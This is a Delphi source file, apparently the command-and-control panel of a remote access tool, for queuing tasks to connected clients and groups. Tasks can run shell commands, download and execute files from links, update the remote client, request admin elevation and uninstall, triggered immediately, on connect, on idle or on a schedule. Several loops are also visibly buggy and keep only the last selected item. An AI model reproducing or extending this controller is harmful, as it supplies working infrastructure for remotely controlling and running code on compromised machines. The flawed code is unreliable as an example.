unit UnitClientsTasks;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, ToolWin, Menus, ImgList, UnitMain, UnitConstants,
  SocketUnitEx, UnitCommands, UnitFunctions, UnitEncryption, UnitVariables,
  uJSONConfig;

type
  TFormClientsTasks = class(TForm)
    tlb1: TToolBar;
    btn5: TToolButton;
    btn13: TToolButton;
    lv1: TListView;
    il1: TImageList;
    pm1: TPopupMenu;
    R1: TMenuItem;
    R2: TMenuItem;
    procedure btn5Click(Sender: TObject);
    procedure btn13Click(Sender: TObject);
    procedure R1Click(Sender: TObject);
    procedure R2Click(Sender: TObject);
    procedure lv1ColumnClick(Sender: TObject; Column: TListColumn);
    procedure FormCreate(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
  private
    { Private declarations }
    function RetrieveTasks: string;
  public
    { Public declarations }
    procedure CheckTask(ClientDatas: TClientDatas = nil; Idle: string = '';
      OnIdle: Boolean = False; OnConnect: Boolean = True);
    procedure SavePendingTasks;
    procedure LoadPendingTasks;
  end;

var
  FormClientsTasks: TFormClientsTasks;

implementation

uses
  UnitTasks;

{$R *.dfm}

type
  TTaskCmd = class
    Cmd: string;
  end;

var
  LastColumn: TListColumn;
  Ascending: Boolean;

procedure TFormClientsTasks.btn5Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpItem: TListItem;
  TmpForm: TFormTasks;
  TmpBool: Boolean;
  TmpStr, TmpStr1: string;
  i: Integer;
  TaskCmd: TTaskCmd;
begin
  TmpForm := TFormTasks.Create(Self);
  if TmpForm.ShowModal <> mrOK then
  begin
    TmpForm.Release;
    TmpForm.Free;
    Exit;
  end;

  if TmpForm.lst1.ItemIndex = - 1 then
  begin
    MessageBox(Handle, 'No command selected.', PROGRAMINFOS, MB_ICONERROR);
    Exit;
  end;

  if TmpForm.rb4.Checked then
  begin
    for i := 0 to TmpForm.lv1.Items.Count - 1 do
    TmpBool := TmpForm.lv1.Items.Item[i].Checked;
  end
  else
  begin
    for i := 0 to TmpForm.lv2.Items.Count - 1 do
    TmpBool := TmpForm.lv2.Items.Item[i].Checked;
  end;

  if TmpBool = False then
  begin
    MessageBox(Handle, 'No group or client selected.', PROGRAMINFOS, MB_ICONERROR);
    Exit;
  end;

  if TmpForm.rb4.Checked then
  begin
    i := TmpForm.lst1.ItemIndex;
    TmpItem := lv1.Items.Add;
    TmpItem.Caption := TmpForm.lst1.Items.Strings[i];

    for i := 0 to TmpForm.lv1.Items.Count - 1 do
    TmpStr := TmpForm.lv1.Items.Item[i].Caption + '×';

    TmpItem.SubItems.Add(TmpStr);

    if TmpForm.rb1.Checked then TmpItem.SubItems.Add(TmpForm.rb1.Caption) else
    if TmpForm.rb2.Checked then TmpItem.SubItems.Add(TmpForm.rb2.Caption) else
    if TmpForm.rb3.Checked then
      TmpItem.SubItems.Add(DateToStr(TmpForm.dtp1.Date) + ' ' + TimeToStr(TmpForm.dtp2.Time));

    TmpItem.SubItems.Add('Pending');
    TmpItem.SubItemImages[2] := 3;  
    TmpItem.ImageIndex := 0;

    TaskCmd := TTaskCmd.Create;

    case TmpForm.lst1.ItemIndex of
      0:  if TmpForm.edtWeb.Text <> '' then
          TaskCmd.Cmd := MyBoolToStr(TmpForm.chk3.Checked) + '|' + EXECUTESHELLCOMMAND + '|start ' + TmpForm.edtWeb.Text;
      1:  if TmpForm.edtShell.Text <> '' then
          TaskCmd.Cmd := MyBoolToStr(TmpForm.chk3.Checked) + '|' + EXECUTESHELLCOMMAND + '|' + TmpForm.edtShell.Text;
      2:  if TmpForm.edtUpf.Text <> '' then
          TaskCmd.Cmd := MyBoolToStr(TmpForm.chk3.Checked) + '|' + CLIENTUPDATEFROMLOCAL + '|' + TmpForm.edtUpf.Text + '|' + IntToStr(MyGetFileSize(TmpForm.edtUpf.Text)) + #0;
      3:  if TmpForm.edtUpl.Text <> '' then
          TaskCmd.Cmd := MyBoolToStr(TmpForm.chk3.Checked) + '|' + CLIENTUPDATEFROMLINK + '|' + TmpForm.edtUpl.Text;
      4:  if TmpForm.edtDwf.Text <> '' then
          begin
            if TmpForm.chk1.Checked then
              TaskCmd.Cmd := MyBoolToStr(TmpForm.chk3.Checked) + '|' + FILESEXECUTEFROMLOCAL + '|' + TmpForm.edtDwf.Text + '|Y|' + IntToStr(MyGetFileSize(TmpForm.edtDwf.Text)) + #0
            else TaskCmd.Cmd := MyBoolToStr(TmpForm.chk3.Checked) + '|' + FILESEXECUTEFROMLOCAL + '|' + TmpForm.edtDwf.Text + '|N|' + IntToStr(MyGetFileSize(TmpForm.edtDwf.Text)) + #0;
          end;
      5:  if TmpForm.edtDwl.Text <> '' then
          begin
            if TmpForm.chk2.Checked then
              TaskCmd.Cmd := MyBoolToStr(TmpForm.chk3.Checked) + '|' + FILESEXECUTEFROMLINK + '|' + TmpForm.edtDwl.Text + '|Y'
            else TaskCmd.Cmd := MyBoolToStr(TmpForm.chk3.Checked) + '|' + FILESEXECUTEFROMLINK + '|' + TmpForm.edtDwl.Text + '|N';
          end;
      6: TaskCmd.Cmd := 'No|' + REQUESTADMIN + '|';
      7:  if TmpForm.edtUpc.Text <> '' then
          begin
            TmpStr := FileToStr(TmpForm.edtUpc.Text);
            TmpStr := EnDecryptText(TmpStr, PROGRAMPASSWORD);
            i := StringCount('|', TmpStr);
            if i <> 42 then Exit;
            TmpStr := MyReplaceStr(TmpStr, '|', '×');
            TaskCmd.Cmd := MyBoolToStr(TmpForm.chk3.Checked) + '|' + CLIENTUPDATECONFIG + '|' + TmpStr + '|' + MyBoolToStr(TmpForm.chk4.Checked);
          end;
      8: TaskCmd.Cmd := MyBoolToStr(TmpForm.chk3.Checked) + '|' + CLIENTUNINSTALL + '|';
    end;

    if TaskCmd.Cmd = '' then
    begin
      TmpItem.Delete;
      Exit;
    end;

    TmpItem.Data := TaskCmd;
    TmpBool := False;

    if TmpForm.rb1.Checked then
    begin
      TaskCmd.Cmd := CLIENTTASKEXECUTE + '|' + TaskCmd.Cmd;

      TmpStr := TmpItem.SubItems[0];
      while TmpStr <> '' do
      begin           
        Application.ProcessMessages;
        TmpStr1 := Copy(TmpStr, 1, Pos('×', TmpStr) - 1);
        Delete(TmpStr, 1, Pos('×', TmpStr));

        for i := 0 to ClientsList.Count - 1 do
        begin  
          Application.ProcessMessages;
          ClientDatas := TClientDatas(ClientsList[i]);
          if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
          if ClientDatas.Infos.GroupId <> TmpStr1 then Continue;
          TmpBool := ClientDatas.SendDatas(TaskCmd.Cmd) <> -1;
        end;
      end;

      if TmpBool = False then
      begin
        TmpItem.SubItemImages[2] := 2;
        TmpItem.SubItems[2] := 'Failed';
      end
      else
      begin
        TmpItem.SubItemImages[2] := 1;
        TmpItem.SubItems[2] := 'Done';
      end;
    end;
  end
  else
  begin
    i := TmpForm.lst1.ItemIndex;
    TmpItem := lv1.Items.Add;
    TmpItem.Caption := TmpForm.lst1.Items.Strings[i];

    for i := 0 to TmpForm.lv2.Items.Count - 1 do
    TmpStr := TmpForm.lv2.Items.Item[i].Caption + '×';

    TmpItem.SubItems.Add(TmpStr);

    if TmpForm.rb1.Checked then TmpItem.SubItems.Add(TmpForm.rb1.Caption) else
    if TmpForm.rb2.Checked then TmpItem.SubItems.Add(TmpForm.rb2.Caption) else
    if TmpForm.rb3.Checked then
      TmpItem.SubItems.Add(DateToStr(TmpForm.dtp1.Date) + ' ' + TimeToStr(TmpForm.dtp2.Time));

    TmpItem.SubItems.Add('Pending');
    TmpItem.SubItemImages[2] := 3;  
    TmpItem.ImageIndex := 0;
           
    TaskCmd := TTaskCmd.Create;

    case TmpForm.lst1.ItemIndex of
      0:  if TmpForm.edtWeb.Text <> '' then
          TaskCmd.Cmd := MyBoolToStr(TmpForm.chk3.Checked) + '|' + EXECUTESHELLCOMMAND + '|start ' + TmpForm.edtWeb.Text;
      1:  if TmpForm.edtShell.Text <> '' then
          TaskCmd.Cmd := MyBoolToStr(TmpForm.chk3.Checked) + '|' + EXECUTESHELLCOMMAND + '|' + TmpForm.edtShell.Text;
      2:  if TmpForm.edtUpf.Text <> '' then
          TaskCmd.Cmd := MyBoolToStr(TmpForm.chk3.Checked) + '|' + CLIENTUPDATEFROMLOCAL + '|' + TmpForm.edtUpf.Text + '|' + IntToStr(MyGetFileSize(TmpForm.edtUpf.Text)) + #0;
      3:  if TmpForm.edtUpl.Text <> '' then
          TaskCmd.Cmd := MyBoolToStr(TmpForm.chk3.Checked) + '|' + CLIENTUPDATEFROMLINK + '|' + TmpForm.edtUpl.Text;
      4:  if TmpForm.edtDwf.Text <> '' then
          begin
            if TmpForm.chk1.Checked then
              TaskCmd.Cmd := MyBoolToStr(TmpForm.chk3.Checked) + '|' + FILESEXECUTEFROMLOCAL + '|' + TmpForm.edtDwf.Text + '|Y|' + IntToStr(MyGetFileSize(TmpForm.edtDwf.Text)) + #0
            else TaskCmd.Cmd := MyBoolToStr(TmpForm.chk3.Checked) + '|' + FILESEXECUTEFROMLOCAL + '|' + TmpForm.edtDwf.Text + '|N|' + IntToStr(MyGetFileSize(TmpForm.edtDwf.Text)) + #0;
          end;
      5:  if TmpForm.edtDwl.Text <> '' then
          begin
            if TmpForm.chk2.Checked then
              TaskCmd.Cmd := MyBoolToStr(TmpForm.chk3.Checked) + '|' + FILESEXECUTEFROMLINK + '|' + TmpForm.edtDwl.Text + '|Y'
            else TaskCmd.Cmd := MyBoolToStr(TmpForm.chk3.Checked) + '|' + FILESEXECUTEFROMLINK + '|' + TmpForm.edtDwl.Text + '|N';
          end;
      6: TaskCmd.Cmd := 'No|' + REQUESTADMIN + '|';
      7:  if TmpForm.edtUpc.Text <> '' then
          begin
            TmpStr := FileToStr(TmpForm.edtUpc.Text);
            TmpStr := EnDecryptText(TmpStr, PROGRAMPASSWORD);
            i := StringCount('|', TmpStr);
            if i <> 42 then Exit;
            TmpStr := MyReplaceStr(TmpStr, '|', '×');
            TaskCmd.Cmd := MyBoolToStr(TmpForm.chk3.Checked) + '|' + CLIENTUPDATECONFIG + '|' + TmpStr + '|' + MyBoolToStr(TmpForm.chk4.Checked);
          end;
      8: TaskCmd.Cmd := MyBoolToStr(TmpForm.chk3.Checked) + '|' + CLIENTUNINSTALL + '|';
    end;

    if TaskCmd.Cmd = '' then
    begin
      TmpItem.Delete;
      Exit;
    end;

    TmpItem.Data := TaskCmd;
    TmpBool := False;

    if TmpForm.rb1.Checked then
    begin
      TaskCmd.Cmd := CLIENTTASKEXECUTE + '|' + TaskCmd.Cmd;

      TmpStr := TmpItem.SubItems[0];
      while TmpStr <> '' do
      begin  
      Application.ProcessMessages;
        TmpStr1 := Copy(TmpStr, 1, Pos('×', TmpStr) - 1);
        Delete(TmpStr, 1, Pos('×', TmpStr));

        for i := 0 to ClientsList.Count - 1 do
        begin         
          Application.ProcessMessages;
          ClientDatas := TClientDatas(ClientsList[i]);
          if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
          if ClientDatas.UserId <> TmpStr1 then Continue;
          TmpBool := ClientDatas.SendDatas(TaskCmd.Cmd) <> -1;
        end;
      end;

      if TmpBool = False then
      begin
        TmpItem.SubItemImages[2] := 2;
        TmpItem.SubItems[2] := 'Failed';
      end
      else
      begin
        TmpItem.SubItemImages[2] := 1;
        TmpItem.SubItems[2] := 'Done';
      end;
    end;
  end;

  TmpForm.Release;
  TmpForm.Free;
end;

procedure TFormClientsTasks.btn13Click(Sender: TObject);
var
  i: Integer;
begin
  for i := lv1.Items.Count - 1 downto 0 do
  begin
    if (lv1.Items.Item[i].SubItemImages[2] = 1) or (lv1.Items.Item[i].SubItemImages[2] = 2) then
      lv1.Items.Item[i].Delete;
  end;
end;

procedure TFormClientsTasks.R1Click(Sender: TObject);
var
  i: Integer;
begin
  for i := lv1.Items.Count -1 downto 0 do
  if lv1.Items.Item[i].Selected then lv1.Items.Item[i].Delete;
end;

procedure TFormClientsTasks.CheckTask(ClientDatas: TClientDatas; Idle: string;
  OnIdle, OnConnect: Boolean);
var
  TmpStr, TmpStr1, Cmd: string;
  TmpBool: Boolean;
  i, j: Integer;
begin
  if OnConnect then
  begin
    for i := 0 to lv1.Items.Count - 1 do
    begin
      if lv1.Items.Item[i].SubItems[1] <> 'On connect' then Continue;
      if lv1.Items.Item[i].Data = nil then Continue;

      Cmd := CLIENTTASKEXECUTE + '|' + TTaskCmd(lv1.Items.Item[i].Data).Cmd;
      TmpStr := lv1.Items.Item[i].SubItems[0];

      TmpStr := lv1.Items.Item[i].SubItems[0]; //Stupid shit, don't remove it!!
      while TmpStr <> '' do
      begin        
        Application.ProcessMessages;
        TmpStr1 := Copy(TmpStr, 1, Pos('×', TmpStr) - 1);
        Delete(TmpStr, 1, Pos('×', TmpStr));

        if ClientDatas.UserId = TmpStr1 then
          TmpBool := ClientDatas.SendDatas(Cmd) <> -1
        else

        if ClientDatas.Infos.GroupId = TmpStr1 then
          TmpBool := ClientDatas.SendDatas(Cmd) <> -1;
      end;

      if TmpBool = False then
      begin
        lv1.Items.Item[i].SubItemImages[2] := 2;
        lv1.Items.Item[i].SubItems[2] := 'Failed';
      end
      else
      begin
        lv1.Items.Item[i].SubItemImages[2] := 1;
        lv1.Items.Item[i].SubItems[2] := 'Done';
      end;
    end;
  end
  else

  if OnIdle then
  begin
    for i := 0 to lv1.Items.Count - 1 do
    begin
      if (lv1.Items.Item[i].SubItems[1] = 'On connect') or
        (lv1.Items.Item[i].SubItems[1] = 'Immediatly')
      then Continue;

      if lv1.Items.Item[i].SubItems[1] <> Idle then Continue;
      if lv1.Items.Item[i].Data = nil then Continue;

      Cmd := CLIENTTASKEXECUTE + '|' + TTaskCmd(lv1.Items.Item[i].Data).Cmd;
      TmpStr := lv1.Items.Item[i].SubItems[0];

      TmpStr := lv1.Items.Item[i].SubItems[0]; //Stupid shit, don't remove it!!
      while TmpStr <> '' do
      begin                              
        Application.ProcessMessages;
        TmpStr1 := Copy(TmpStr, 1, Pos('×', TmpStr) - 1);
        Delete(TmpStr, 1, Pos('×', TmpStr));

        if ClientDatas.UserId = TmpStr1 then
          TmpBool := ClientDatas.SendDatas(Cmd) <> -1
        else

        if ClientDatas.Infos.GroupId = TmpStr1 then
          TmpBool := ClientDatas.SendDatas(Cmd) <> -1;
      end;

      if TmpBool = False then
      begin
        lv1.Items.Item[i].SubItemImages[2] := 2;
        lv1.Items.Item[i].SubItems[2] := 'Failed';
      end
      else
      begin
        lv1.Items.Item[i].SubItemImages[2] := 1;
        lv1.Items.Item[i].SubItems[2] := 'Done';
      end;
    end;
  end;
end;
         
function TFormClientsTasks.RetrieveTasks: string;
var
  i: Integer;
begin
  Result := '';
  for i := 0 to lv1.Items.Count - 1 do
  begin
    if lv1.Items.Item[i].SubItemImages[2] <> 3 then Continue;
    Result := Result + lv1.Items.Item[i].Caption + '¥';
    Result := Result + lv1.Items.Item[i].SubItems.Strings[0] + '¥';
    Result := Result + lv1.Items.Item[i].SubItems.Strings[1] + '¥';
    Result := Result + lv1.Items.Item[i].SubItems.Strings[2] + '¥';
    Result := Result + TTaskCmd(lv1.Items.Item[i].Data).Cmd + '¥';
    Result := Result + '¥' + #13#10;
  end;
end;

procedure TFormClientsTasks.SavePendingTasks;
var
  TmpStr, TmpStr1: string;
begin
  TmpStr := ExtractFilePath(ParamStr(0)) + 'Settings';
  if not DirectoryExists(TmpStr) then CreateDir(TmpStr);
  TmpStr := TmpStr + '\Tasks.settings';
  if FileExists(TmpStr) then DeleteFile(TmpStr);
  TmpStr1 := RetrieveTasks;
  if TmpStr1 = '' then Exit;
  TmpStr1 := EnDecryptText(TmpStr1, PROGRAMPASSWORD);
  MyCreateFile(TmpStr, TmpStr1, Length(TmpStr1));
end;

procedure TFormClientsTasks.LoadPendingTasks;
var
  TmpStr, TmpStr1: string;
  TmpList: TStringArray;
  TmpItem: TListItem;
  TaskCmd: TTaskCmd;
begin
  if not FileExists(ExtractFilePath(ParamStr(0)) + 'Settings\Tasks.settings') then Exit;
  TmpStr := FileToStr(ExtractFilePath(ParamStr(0)) + 'Settings\Tasks.settings');
  TmpStr := EnDecryptText(TmpStr, PROGRAMPASSWORD);

  lv1.Items.BeginUpdate;
    
  while Pos(#13#10, TmpStr) > 0 do
  begin
    Application.ProcessMessages;
    TmpStr1 := Copy(TmpStr, 1, Pos(#13#10, TmpStr) - 1);
    Delete(TmpStr, 1, Pos(#13#10, TmpStr));
    TmpList := ParseString('¥', TmpStr1);

    TmpItem := lv1.Items.Add;
    TmpItem.Caption := TmpList[0];
    TmpItem.SubItems.Add(TmpList[1]);
    TmpItem.SubItems.Add(TmpList[2]);  
    TmpItem.SubItems.Add(TmpList[3]);
    TmpItem.ImageIndex := 0;
    TmpItem.SubItemImages[2] := 3;

    TaskCmd := TTaskCmd.Create;
    TaskCmd.Cmd := TmpList[4];
    TmpItem.Data := TaskCmd;
  end;

  lv1.Items.EndUpdate;
end;

procedure TFormClientsTasks.R2Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpStr, TmpStr1, Cmd: string;
  TmpBool: Boolean;
  i, j: Integer;
begin
  for i := 0 to lv1.Items.Count -1 do
  begin
    if not lv1.Items.Item[i].Selected then Continue;
    if lv1.Items.Item[i].SubItems[2] = 'Pending' then Continue;

    if lv1.Items.Item[i].SubItems[1] = 'Immediatly' then
    begin
      Cmd := CLIENTTASKEXECUTE + '|' + TTaskCmd(lv1.Items.Item[i].Data).Cmd;

      TmpStr := lv1.Items.Item[i].SubItems[0];
      while TmpStr <> '' do
      begin       
        Application.ProcessMessages;
        TmpStr1 := Copy(TmpStr, 1, Pos('×', TmpStr) - 1);
        Delete(TmpStr, 1, Pos('×', TmpStr));

        for j := 0 to ClientsList.Count - 1 do
        begin
          Application.ProcessMessages;
          ClientDatas := TClientDatas(ClientsList[j]);
          if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;

          if ClientDatas.UserId = TmpStr1 then
            TmpBool := ClientDatas.SendDatas(Cmd) <> -1
          else

          if ClientDatas.Infos.GroupId = TmpStr1 then
            TmpBool := ClientDatas.SendDatas(Cmd) <> -1;
        end;
      end;

      if TmpBool = False then
      begin
        lv1.Items.Item[i].SubItemImages[2] := 2;
        lv1.Items.Item[i].SubItems[2] := 'Failed';
      end
      else
      begin
        lv1.Items.Item[i].SubItemImages[2] := 1;
        lv1.Items.Item[i].SubItems[2] := 'Done';
      end;

      Exit;
    end;
    
    if lv1.Items.Item[i].SubItems[1] <> 'On connect' then
    if StrToDateTime(lv1.Items.Item[i].SubItems[1]) >= Now then Exit;

    lv1.Items.Item[i].SubItems[2] := 'Pending';
    lv1.Items.Item[i].SubItemImages[2] := 3;
  end;
end;
    
function SortByColumn(Item1, Item2: TListItem; Data: Integer): Integer; stdcall;
begin
  if (LastColumn.Index = 0) or (LastColumn.Index = 1) or
    (LastColumn.Index = 3)
  then
  begin
    if Data = 0 then Result := AnsiCompareText(Item1.Caption, Item2.Caption) else
      Result := AnsiCompareText(Item1.SubItems[Data - 1], Item2.SubItems[Data - 1]);
  end;

  if not Ascending then Result := -Result;
end;

procedure TFormClientsTasks.lv1ColumnClick(Sender: TObject;
  Column: TListColumn);
var
  i: Integer;
begin
  Ascending := not Ascending;
  if Column <> LastColumn then Ascending := not Ascending;
  LastColumn := Column;
  lv1.CustomSort(@SortByColumn, LastColumn.Index);
end;

procedure TFormClientsTasks.FormCreate(Sender: TObject);
var
  JSONConfig: TJSONConfig;    
  i: Integer;
begin
  //Load window position settings
  JSONConfig := TJSONConfig.Create(WindowsSettings, PROGRAMPASSWORD);
  JSONConfig.LoadConfig;
  i := JSONConfig.ReadInteger('Tasks width');
  if i <= 0 then Width := 696 else Width := i;
  i := JSONConfig.ReadInteger('Tasks height');
  if i <= 0 then Height := 360 else Height := i;
  i := JSONConfig.ReadInteger('Tasks left');
  if i <= 0 then Left := (Screen.Width - Width) div 2 else Left := i;
  i := JSONConfig.ReadInteger('Tasks top');
  if i <= 0 then Top := (Screen.Height - Height) div 2 else Top := i;
  JSONConfig.Free;
end;

procedure TFormClientsTasks.FormClose(Sender: TObject;
  var Action: TCloseAction);           
var
  JSONConfig: TJSONConfig;
begin
  JSONConfig := TJSONConfig.Create(WindowsSettings, PROGRAMPASSWORD);
  JSONConfig.WriteInteger('Tasks width', Width);
  JSONConfig.WriteInteger('Tasks height', Height);
  JSONConfig.WriteInteger('Tasks left', Left);
  JSONConfig.WriteInteger('Tasks top', Top);
  JSONConfig.SaveConfig;
  JSONConfig.Free;
end;

end.
